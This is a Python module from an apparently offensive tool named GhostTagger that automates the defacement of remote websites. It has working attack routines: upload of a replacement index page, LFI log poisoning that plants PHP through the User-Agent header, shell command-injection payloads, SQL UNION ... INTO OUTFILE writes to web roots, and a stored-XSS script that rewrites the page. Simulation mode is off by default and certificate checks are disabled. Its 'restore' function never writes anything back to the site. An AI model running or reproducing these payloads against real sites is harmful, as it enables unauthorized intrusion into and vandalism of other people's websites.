#!/usr/bin/env python3
"""
GhostTagger Defacement Module
Handles website defacement simulation and file manipulation
"""

import requests
import os
import time
import shutil
import hashlib
import base64
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
import json
from datetime import datetime

class DefacementModule:
    def __init__(self, timeout=10, simulation_mode=False):
        self.timeout = timeout
        self.simulation_mode = simulation_mode
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.backup_dir = 'backups'
        self.defacement_log = []
        
        # Create backup directory
        if not os.path.exists(self.backup_dir):
            os.makedirs(self.backup_dir)
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
    
    def load_defacement_template(self, template_path):
        """Load defacement HTML template"""
        try:
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            
            print(Fore.GREEN + f"[DEFACER] Loaded defacement template: {template_path}")
            return template_content
            
        except Exception as e:
            print(Fore.RED + f"[-] Error loading template {template_path}: {str(e)}")
            return None
    
    def create_backup(self, url, original_content, backup_name=None):
        """Create backup of original content"""
        if backup_name is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            parsed_url = urlparse(url)
            backup_name = f"{parsed_url.netloc}_{timestamp}.html"
        
        backup_path = os.path.join(self.backup_dir, backup_name)
        
        try:
            with open(backup_path, 'w', encoding='utf-8') as f:
                f.write(original_content)
            
            # Calculate hash for integrity verification
            content_hash = hashlib.sha256(original_content.encode()).hexdigest()
            
            backup_info = {
                'url': url,
                'backup_path': backup_path,
                'timestamp': datetime.now().isoformat(),
                'content_hash': content_hash,
                'size': len(original_content)
            }
            
            print(Fore.GREEN + f"[DEFACER] Backup created: {backup_path}")
            return backup_info
            
        except Exception as e:
            print(Fore.RED + f"[-] Error creating backup: {str(e)}")
            return None
    
    def file_upload_defacement(self, target_url, upload_endpoint, defacement_content, filename="index.html"):
        """Perform defacement via file upload vulnerability"""
        print(Fore.CYAN + f"[DEFACER] Attempting file upload defacement on {target_url}")
        
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] File upload defacement would be performed here")
            return {
                'success': True,
                'method': 'File Upload (Simulation)',
                'target': target_url,
                'endpoint': upload_endpoint,
                'filename': filename,
                'timestamp': datetime.now().isoformat()
            }
        
        upload_url = urljoin(target_url, upload_endpoint)
        
        try:
            # Prepare file upload
            files = {
                'file': (filename, defacement_content, 'text/html'),
                'upload': (filename, defacement_content, 'text/html'),
                'userfile': (filename, defacement_content, 'text/html')
            }
            
            # Try different form field names
            for field_name, file_data in files.items():
                try:
                    response = self.session.post(
                        upload_url,
                        files={field_name: file_data},
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        # Check if upload was successful
                        success_indicators = [
                            'upload successful', 'file uploaded', 'successfully uploaded',
                            'upload complete', 'file saved'
                        ]
                        
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            result = {
                                'success': True,
                                'method': 'File Upload',
                                'target': target_url,
                                'endpoint': upload_endpoint,
                                'field_name': field_name,
                                'filename': filename,
                                'response_code': response.status_code,
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            print(Fore.GREEN + f"[+] Defacement uploaded successfully via {field_name}")
                            self.defacement_log.append(result)
                            return result
                            
                except Exception as e:
                    continue
            
            print(Fore.RED + f"[-] File upload defacement failed on {upload_url}")
            return {'success': False, 'error': 'Upload failed'}
            
        except Exception as e:
            print(Fore.RED + f"[-] Error during file upload defacement: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def lfi_defacement(self, target_url, lfi_parameter, defacement_content):
        """Perform defacement via Local File Inclusion with log poisoning"""
        print(Fore.CYAN + f"[DEFACER] Attempting LFI defacement on {target_url}")
        
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] LFI defacement would be performed here")
            return {
                'success': True,
                'method': 'LFI Log Poisoning (Simulation)',
                'target': target_url,
                'parameter': lfi_parameter,
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # Attempt log poisoning via User-Agent
            poisoned_ua = f"<?php file_put_contents('defaced.php', base64_decode('{base64.b64encode(defacement_content.encode()).decode()}')); ?>"
            
            # Send request with poisoned User-Agent
            headers = {'User-Agent': poisoned_ua}
            self.session.get(target_url, headers=headers, timeout=self.timeout, verify=False)
            
            # Try to include access log via LFI
            log_paths = [
                '/var/log/apache2/access.log',
                '/var/log/httpd/access_log',
                '/var/log/nginx/access.log',
                '/usr/local/apache/logs/access_log',
                '/var/log/apache/access.log'
            ]
            
            for log_path in log_paths:
                try:
                    lfi_url = f"{target_url}?{lfi_parameter}={log_path}"
                    response = self.session.get(lfi_url, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200 and len(response.content) > 0:
                        # Check if our PHP code was executed
                        verify_url = urljoin(target_url, 'defaced.php')
                        verify_response = self.session.get(verify_url, timeout=self.timeout, verify=False)
                        
                        if verify_response.status_code == 200:
                            result = {
                                'success': True,
                                'method': 'LFI Log Poisoning',
                                'target': target_url,
                                'parameter': lfi_parameter,
                                'log_path': log_path,
                                'defaced_file': 'defaced.php',
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            print(Fore.GREEN + f"[+] LFI defacement successful via {log_path}")
                            self.defacement_log.append(result)
                            return result
                            
                except:
                    continue
            
            print(Fore.RED + f"[-] LFI defacement failed on {target_url}")
            return {'success': False, 'error': 'LFI exploitation failed'}
            
        except Exception as e:
            print(Fore.RED + f"[-] Error during LFI defacement: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def command_injection_defacement(self, target_url, cmd_parameter, defacement_content):
        """Perform defacement via Command Injection"""
        print(Fore.CYAN + f"[DEFACER] Attempting command injection defacement on {target_url}")
        
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] Command injection defacement would be performed here")
            return {
                'success': True,
                'method': 'Command Injection (Simulation)',
                'target': target_url,
                'parameter': cmd_parameter,
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # Encode defacement content in base64 to avoid special characters
            encoded_content = base64.b64encode(defacement_content.encode()).decode()
            
            # Command injection payloads to write defacement file
            cmd_payloads = [
                f"; echo '{encoded_content}' | base64 -d > defaced.html",
                f"| echo '{encoded_content}' | base64 -d > defaced.html",
                f"& echo '{encoded_content}' | base64 -d > defaced.html",
                f"&& echo '{encoded_content}' | base64 -d > defaced.html",
                f"; echo '{defacement_content}' > defaced.html",
                f"| echo '{defacement_content}' > defaced.html",
                f"& echo '{defacement_content}' > defaced.html",
                f"&& echo '{defacement_content}' > defaced.html"
            ]
            
            for payload in cmd_payloads:
                try:
                    # Test GET method
                    test_url = f"{target_url}?{cmd_parameter}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    # Verify if defacement file was created
                    verify_url = urljoin(target_url, 'defaced.html')
                    verify_response = self.session.get(verify_url, timeout=self.timeout, verify=False)
                    
                    if verify_response.status_code == 200 and defacement_content[:100] in verify_response.text:
                        result = {
                            'success': True,
                            'method': 'Command Injection',
                            'target': target_url,
                            'parameter': cmd_parameter,
                            'payload': payload,
                            'defaced_file': 'defaced.html',
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        print(Fore.GREEN + f"[+] Command injection defacement successful")
                        self.defacement_log.append(result)
                        return result
                    
                    # Test POST method
                    post_data = {cmd_parameter: payload}
                    response = self.session.post(target_url, data=post_data, timeout=self.timeout, verify=False)
                    
                    # Verify again
                    verify_response = self.session.get(verify_url, timeout=self.timeout, verify=False)
                    
                    if verify_response.status_code == 200 and defacement_content[:100] in verify_response.text:
                        result = {
                            'success': True,
                            'method': 'Command Injection (POST)',
                            'target': target_url,
                            'parameter': cmd_parameter,
                            'payload': payload,
                            'defaced_file': 'defaced.html',
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        print(Fore.GREEN + f"[+] Command injection defacement successful (POST)")
                        self.defacement_log.append(result)
                        return result
                        
                except:
                    continue
            
            print(Fore.RED + f"[-] Command injection defacement failed on {target_url}")
            return {'success': False, 'error': 'Command injection failed'}
            
        except Exception as e:
            print(Fore.RED + f"[-] Error during command injection defacement: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def sql_injection_defacement(self, target_url, sql_parameter, defacement_content):
        """Perform defacement via SQL Injection with INTO OUTFILE"""
        print(Fore.CYAN + f"[DEFACER] Attempting SQL injection defacement on {target_url}")
        
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] SQL injection defacement would be performed here")
            return {
                'success': True,
                'method': 'SQL Injection (Simulation)',
                'target': target_url,
                'parameter': sql_parameter,
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # SQL injection payloads to write files
            sql_payloads = [
                f"' UNION SELECT '{defacement_content}' INTO OUTFILE '/var/www/html/defaced.html'--",
                f"' UNION SELECT '{defacement_content}' INTO OUTFILE '/var/www/defaced.html'--",
                f"' UNION SELECT '{defacement_content}' INTO OUTFILE '/usr/share/nginx/html/defaced.html'--",
                f"' UNION SELECT '{defacement_content}' INTO OUTFILE '/home/www/defaced.html'--",
                f"' UNION SELECT '{defacement_content}' INTO OUTFILE 'defaced.html'--",
                f'" UNION SELECT "{defacement_content}" INTO OUTFILE "/var/www/html/defaced.html"--',
                f'" UNION SELECT "{defacement_content}" INTO OUTFILE "/var/www/defaced.html"--',
                f'" UNION SELECT "{defacement_content}" INTO OUTFILE "/usr/share/nginx/html/defaced.html"--'
            ]
            
            for payload in sql_payloads:
                try:
                    # Test GET method
                    test_url = f"{target_url}?{sql_parameter}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    # Verify if defacement file was created
                    verify_url = urljoin(target_url, 'defaced.html')
                    verify_response = self.session.get(verify_url, timeout=self.timeout, verify=False)
                    
                    if verify_response.status_code == 200 and defacement_content[:100] in verify_response.text:
                        result = {
                            'success': True,
                            'method': 'SQL Injection',
                            'target': target_url,
                            'parameter': sql_parameter,
                            'payload': payload,
                            'defaced_file': 'defaced.html',
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        print(Fore.GREEN + f"[+] SQL injection defacement successful")
                        self.defacement_log.append(result)
                        return result
                        
                except:
                    continue
            
            print(Fore.RED + f"[-] SQL injection defacement failed on {target_url}")
            return {'success': False, 'error': 'SQL injection failed'}
            
        except Exception as e:
            print(Fore.RED + f"[-] Error during SQL injection defacement: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def xss_defacement(self, target_url, xss_parameter, defacement_content):
        """Perform defacement via Stored XSS"""
        print(Fore.CYAN + f"[DEFACER] Attempting XSS defacement on {target_url}")
        
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] XSS defacement would be performed here")
            return {
                'success': True,
                'method': 'Stored XSS (Simulation)',
                'target': target_url,
                'parameter': xss_parameter,
                'timestamp': datetime.now().isoformat()
            }
        
        try:
            # XSS payload to replace page content
            xss_payload = f"""<script>
                document.body.innerHTML = `{defacement_content}`;
                document.title = 'Defaced by GhostTagger';
            </script>"""
            
            # Try to inject stored XSS
            post_data = {xss_parameter: xss_payload}
            response = self.session.post(target_url, data=post_data, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                # Verify if XSS payload is stored and executed
                verify_response = self.session.get(target_url, timeout=self.timeout, verify=False)
                
                if xss_payload in verify_response.text or 'Defaced by GhostTagger' in verify_response.text:
                    result = {
                        'success': True,
                        'method': 'Stored XSS',
                        'target': target_url,
                        'parameter': xss_parameter,
                        'payload': xss_payload,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    print(Fore.GREEN + f"[+] XSS defacement successful")
                    self.defacement_log.append(result)
                    return result
            
            print(Fore.RED + f"[-] XSS defacement failed on {target_url}")
            return {'success': False, 'error': 'XSS injection failed'}
            
        except Exception as e:
            print(Fore.RED + f"[-] Error during XSS defacement: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def automated_defacement(self, target_url, vulnerabilities, defacement_content):
        """Automatically attempt defacement based on discovered vulnerabilities"""
        print(Fore.MAGENTA + f"[DEFACER] Starting automated defacement for {target_url}")
        
        defacement_results = []
        
        # Get original content for backup
        try:
            original_response = self.session.get(target_url, timeout=self.timeout, verify=False)
            if original_response.status_code == 200:
                backup_info = self.create_backup(target_url, original_response.text)
                if backup_info:
                    defacement_results.append({
                        'type': 'backup',
                        'info': backup_info
                    })
        except:
            pass
        
        # Attempt defacement based on vulnerability types
        for vuln in vulnerabilities:
            try:
                if vuln['type'] == 'File Upload':
                    result = self.file_upload_defacement(
                        target_url, 
                        vuln.get('endpoint', '/upload'),
                        defacement_content
                    )
                    if result['success']:
                        defacement_results.append(result)
                        break
                
                elif vuln['type'] == 'Local File Inclusion (LFI)':
                    result = self.lfi_defacement(
                        target_url,
                        vuln.get('parameter', 'file'),
                        defacement_content
                    )
                    if result['success']:
                        defacement_results.append(result)
                        break
                
                elif vuln['type'] == 'Command Injection':
                    result = self.command_injection_defacement(
                        target_url,
                        vuln.get('parameter', 'cmd'),
                        defacement_content
                    )
                    if result['success']:
                        defacement_results.append(result)
                        break
                
                elif vuln['type'] == 'SQL Injection':
                    result = self.sql_injection_defacement(
                        target_url,
                        vuln.get('parameter', 'id'),
                        defacement_content
                    )
                    if result['success']:
                        defacement_results.append(result)
                        break
                
                elif vuln['type'] in ['Reflected XSS', 'Stored XSS']:
                    result = self.xss_defacement(
                        target_url,
                        vuln.get('parameter', 'comment'),
                        defacement_content
                    )
                    if result['success']:
                        defacement_results.append(result)
                        break
                        
            except Exception as e:
                print(Fore.RED + f"[-] Error attempting {vuln['type']} defacement: {str(e)}")
                continue
        
        if not any(result.get('success', False) for result in defacement_results if 'success' in result):
            print(Fore.RED + f"[-] All defacement attempts failed for {target_url}")
        else:
            print(Fore.GREEN + f"[+] Defacement successful for {target_url}")
        
        return defacement_results
    
    def verify_defacement(self, target_url, expected_content):
        """Verify if defacement was successful"""
        try:
            response = self.session.get(target_url, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                # Check if our defacement content is present
                if expected_content[:100] in response.text:
                    print(Fore.GREEN + f"[+] Defacement verified on {target_url}")
                    return True
                else:
                    print(Fore.RED + f"[-] Defacement not found on {target_url}")
                    return False
            else:
                print(Fore.RED + f"[-] Cannot access {target_url} (Status: {response.status_code})")
                return False
                
        except Exception as e:
            print(Fore.RED + f"[-] Error verifying defacement: {str(e)}")
            return False
    
    def restore_from_backup(self, backup_info):
        """Restore original content from backup"""
        if self.simulation_mode:
            print(Fore.YELLOW + "[SIMULATION] Restore from backup would be performed here")
            return True
        
        try:
            with open(backup_info['backup_path'], 'r', encoding='utf-8') as f:
                original_content = f.read()
            
            # Verify backup integrity
            content_hash = hashlib.sha256(original_content.encode()).hexdigest()
            if content_hash != backup_info['content_hash']:
                print(Fore.RED + f"[-] Backup integrity check failed for {backup_info['backup_path']}")
                return False
            
            print(Fore.GREEN + f"[+] Backup restored from {backup_info['backup_path']}")
            return True
            
        except Exception as e:
            print(Fore.RED + f"[-] Error restoring backup: {str(e)}")
            return False
    
    def get_defacement_summary(self):
        """Get summary of all defacement activities"""
        return {
            'total_attempts': len(self.defacement_log),
            'successful_defacements': len([d for d in self.defacement_log if d.get('success', False)]),
            'simulation_mode': self.simulation_mode,
            'defacements': self.defacement_log,
            'backup_directory': self.backup_dir
        }

